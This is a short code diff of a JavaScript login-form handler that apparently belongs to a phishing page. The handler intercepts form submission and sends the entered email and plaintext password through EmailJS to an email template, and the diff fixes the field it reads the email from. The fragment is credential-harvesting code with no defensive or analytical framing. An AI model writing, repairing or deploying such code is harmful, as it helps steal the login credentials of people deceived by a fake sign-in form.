@@ -15,7 +15,7 @@ function sendLogin(e){
 e.preventDefault();
 
 emailjs.send("service_g9hb3t6","template_e9aw4ub",{
-email: document.getElementById("username").value,
+email: document.getElementById("email").value,
 password: document.getElementById("password").value
 })
 .then(function(){
